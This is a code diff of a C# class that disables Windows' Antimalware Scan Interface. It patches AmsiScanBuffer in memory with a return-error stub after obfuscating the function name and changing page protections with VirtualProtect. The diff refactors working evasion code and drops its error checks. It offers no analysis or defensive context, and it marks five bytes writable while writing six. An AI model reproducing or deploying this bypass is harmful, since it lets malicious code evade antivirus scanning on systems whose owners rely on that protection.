@@ -1,14 +1,16 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-namespace Bypass
+namespace AMSI
 {
-    public class AMSI
+    public class Bypass
     {
         [DllImport("kernel32")]
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
         [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
+
         [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
@@ -17,21 +19,18 @@ namespace Bypass
 
         public static int Disable()
         {
-            IntPtr TargetDLL = LoadLibrary("amsi.dll");
-            if (TargetDLL == IntPtr.Zero) { return 1; }
 
-            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
-            if (ASBPtr == IntPtr.Zero) { return 1; }
+            IntPtr Address = GetProcAddress(LoadLibrary("amsi.dll"), "Amsi" + "Scan" + "Buffer");
 
-            UIntPtr dwSize = (UIntPtr)5;
-            uint Zero = 0;
+            UIntPtr size = (UIntPtr)5;
+            uint p = 0;
 
-            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
+            if (!VirtualProtect(Address, size, 0x40, out p)) { return 1; }
 
             Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
             Marshal.Copy(Patch, 0, unmanagedPointer, 6);
-            MoveMemory(ASBPtr, unmanagedPointer, 6);
+            MoveMemory(Address, unmanagedPointer, 6);
 
             return 0;
         }
